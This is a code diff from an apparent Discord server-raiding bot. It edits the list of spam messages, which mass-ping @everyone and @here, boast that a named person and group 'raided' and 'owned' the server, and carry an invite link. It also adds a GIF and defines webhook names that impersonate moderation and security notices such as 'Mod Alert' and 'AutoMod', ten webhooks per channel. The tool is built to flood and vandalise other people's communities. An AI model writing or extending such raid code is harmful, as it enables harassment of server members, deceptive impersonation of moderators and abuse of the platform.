@@ -20,29 +20,32 @@ from discord.ext import commands
 from utils.state import bot_state
 
 RAID_TAG   = "LAST STAND"
-RAID_SHORT = "LSC"
+RAID_SHORT = "LS"
 RAID_LINK  = "https://discord.gg/s59zWvzK6c"
 
+RAID_GIF = "https://cdn.discordapp.com/attachments/827289915388985404/1493954462580998236/EllenJoe.gif"
+
 SPAM_MSGS = [
-    f"@everyone 💀 **{RAID_TAG}** 💀 {RAID_LINK}",
-    f"@everyone Server owned by {RAID_TAG} {RAID_LINK}",
-    f"@everyone 🔥 {RAID_TAG} WAS HERE 🔥 {RAID_LINK}",
-    f"@everyone Your anti-raid **FAILED** ❌ {RAID_LINK}",
-    f"@everyone ⚔️ {RAID_TAG} RAID ⚔️ {RAID_LINK}",
-    f"@everyone ☠️ GG no re | {RAID_TAG} {RAID_LINK}",
-    f"@everyone 🛡️ Defences down | {RAID_TAG} {RAID_LINK}",
-    f"@everyone 💥 OBLITERATED by {RAID_TAG} {RAID_LINK}",
-    f"@everyone 🚨 BREACH | {RAID_TAG} {RAID_LINK}",
-    f"@everyone 👑 {RAID_TAG} owns this server {RAID_LINK}",
-    f"@here ⚡ PWNED | {RAID_TAG} {RAID_LINK}",
-    f"@here 🔓 ACCESS GRANTED — {RAID_TAG} {RAID_LINK}",
+    f"@everyone 💀 **RAIDED BY JEAN(LORENZO) FROM LAST STAND** 💀 {RAID_LINK}",
+    f"@everyone 💀 **RAIDED BY JEAN(LORENZO) FROM LAST STAND** 💀 {RAID_LINK}\n{RAID_GIF}",
+    f"@everyone ☠️ JEAN(LORENZO) FROM LAST STAND WAS HERE ☠️ {RAID_LINK}",
+    f"@everyone ☠️ JEAN(LORENZO) FROM LAST STAND WAS HERE ☠️ {RAID_LINK}\n{RAID_GIF}",
+    f"@everyone 🔥 YOUR ANTI-RAID **FAILED** — JEAN(LORENZO) FROM LAST STAND 🔥 {RAID_LINK}",
+    f"@everyone ⚔️ JEAN(LORENZO) FROM LAST STAND RAID ⚔️ {RAID_LINK}",
+    f"@everyone 💥 OBLITERATED BY JEAN(LORENZO) FROM LAST STAND 💥 {RAID_LINK}",
+    f"@everyone 💥 OBLITERATED BY JEAN(LORENZO) FROM LAST STAND 💥 {RAID_LINK}\n{RAID_GIF}",
+    f"@everyone 🚨 BREACH | JEAN(LORENZO) | LAST STAND {RAID_LINK}",
+    f"@everyone 👑 JEAN(LORENZO) OWNS THIS SERVER | LAST STAND {RAID_LINK}",
+    f"@here ⚡ PWNED BY JEAN(LORENZO) | LAST STAND {RAID_LINK}",
+    f"@here 🔓 ACCESS GRANTED — JEAN(LORENZO) FROM LAST STAND {RAID_LINK}",
+    f"@here 🎯 JEAN(LORENZO) FROM LAST STAND\n{RAID_GIF}",
 ]
 
 WEBHOOK_NAMES = [
     f"{RAID_SHORT} Alpha", f"{RAID_SHORT} Bravo", f"{RAID_SHORT} Ghost",
     f"{RAID_SHORT} Reaper", f"{RAID_SHORT} Phantom", f"{RAID_SHORT} Viper",
     "Server Announcement", "Mod Alert", "System Notification",
-    "AutoMod", "Security Alert", "Verification System",
+    "AutoMod", "Security Alert", "JEAN(LORENZO)",
 ]
 
 WEBHOOKS_PER_CHANNEL = 10
